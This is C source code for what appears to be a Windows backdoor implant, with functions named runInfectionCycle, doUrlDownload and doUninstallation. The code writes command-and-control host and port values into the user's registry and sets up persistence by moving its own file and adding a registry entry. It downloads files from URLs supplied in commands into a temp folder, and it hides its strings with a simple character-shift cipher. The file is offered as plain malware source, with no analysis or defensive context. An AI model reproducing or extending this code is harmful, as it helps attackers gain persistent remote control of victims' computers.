#include "windows.h"
#include "winreg.h"
#include "urlmon.h"
#include "tinyutils.h"

#pragma comment(lib, "Urlmon.lib")
#pragma comment(lib, "Advapi32.lib")

int doNetworkInfoChange(char* pConnInfoKey, char* pRegistryValue, char* pInputCommand) {
    char* pRegistryData = strstr(pInputCommand, " ");
    pRegistryData[strlen(pRegistryData) - 1] = '\0';
    pRegistryData++;
    decodeCipher(pConnInfoKey);
    decodeCipher(pRegistryValue);
    encodeCipher(pRegistryData);
    writeRegistryData(pConnInfoKey, pRegistryValue, pRegistryData);
    encodeCipher(pConnInfoKey);
    encodeCipher(pRegistryValue);
    return 0;

}

int doUrlDownload(char* pInputCommand) {
    char DownloadTarget[MAX_PATH];
    char* pTempDir = "(orfdodssgdwd(_whps_";
    decodeCipher(pTempDir);
    const char HTTP[5] = "http";
    ExpandEnvironmentStrings((const char*)pTempDir, DownloadTarget, MAX_PATH);
    encodeCipher(pTempDir);
    char* pURL = strstr(pInputCommand, HTTP);
    char* pFileName = strrchr(pURL, '/');
    pFileName++;
    strcat(DownloadTarget, (const char*)pFileName); 
    DownloadTarget[strlen(DownloadTarget) - 1] = '\0';
    URLDownloadToFile(0, (LPCTSTR)pURL, (LPCTSTR)DownloadTarget, 0, 0);
    return 0;
}

int doUninstallation(char* pConnInfoKey, char* pPersistKey, char* pHostValue, char* pPortValue, char* pPersistValue, char currentPath[MAX_PATH]) {
    HKEY hRegistryKey;
    decodeCipher(pConnInfoKey);
    decodeCipher(pPersistKey);
    decodeCipher(pPortValue);
    decodeCipher(pHostValue);
    decodeCipher(pPersistValue);
    RegOpenKeyExA(HKEY_CURRENT_USER, pConnInfoKey, 0, KEY_SET_VALUE, &hRegistryKey);
    RegDeleteValueA(hRegistryKey, pHostValue);
    RegDeleteValueA(hRegistryKey, pPortValue);
    RegOpenKeyExA(HKEY_CURRENT_USER, pPersistKey, 0, KEY_SET_VALUE, &hRegistryKey);
    RegDeleteValueA(hRegistryKey, pPersistValue);
    encodeCipher(pConnInfoKey);
    encodeCipher(pPersistKey);
    encodeCipher(pPortValue);
    encodeCipher(pHostValue);
    encodeCipher(pPersistValue);
    return 0;
}

int runInfectionCycle(char* pConnInfoKey, char* pPersistKey, char* pHostValue, char* pPortValue, char* pPersistValue, char* pHostData, char* pPortData, char* currentPath, char* persistPath) {
        decodeCipher(pConnInfoKey);
        decodeCipher(pPersistKey);
        decodeCipher(pHostValue); 
        decodeCipher(pPortValue);
        decodeCipher(pPersistValue);
        writeRegistryData(pConnInfoKey, pHostValue, pHostData);
        writeRegistryData(pConnInfoKey, pPortValue, pPortData);
        MoveFile(currentPath, persistPath);
        writeRegistryData(pPersistKey, pPersistValue, persistPath);
        encodeCipher(pPersistKey);
        encodeCipher(pPersistValue);
        encodeCipher(pHostValue);
        encodeCipher(pPortValue);
        encodeCipher(pConnInfoKey);
        return 0;
}

int writeRegistryData(char* pRegistryKey, char* pRegistryValue, char * pRegistryData) {
    HKEY hRegistryKey;
    DWORD dwBuffersize = strlen((const char*)pRegistryData) + 1;
    RegOpenKeyExA(HKEY_CURRENT_USER, pRegistryKey, 0, KEY_SET_VALUE, &hRegistryKey);
    RegSetValueExA(hRegistryKey, pRegistryValue, 0, REG_SZ, (const BYTE*)pRegistryData, dwBuffersize);
    return 0;
}

int encodeCipher (char* pStringToEncrypt) {
    int counter;
    int intStringSize = strlen(pStringToEncrypt);
    for (counter = 0; (counter < (intStringSize)); counter++) {
        pStringToEncrypt[counter] = pStringToEncrypt[counter] + 3;
    }
    return 0;
}

int decodeCipher (char* pStringToEncrypt) {
    int counter;
    int intStringSize = strlen(pStringToEncrypt);
    for (counter = 0; (counter < (intStringSize)); counter++) {
        pStringToEncrypt[counter] = pStringToEncrypt[counter] - 3;
    }
    return 0;
}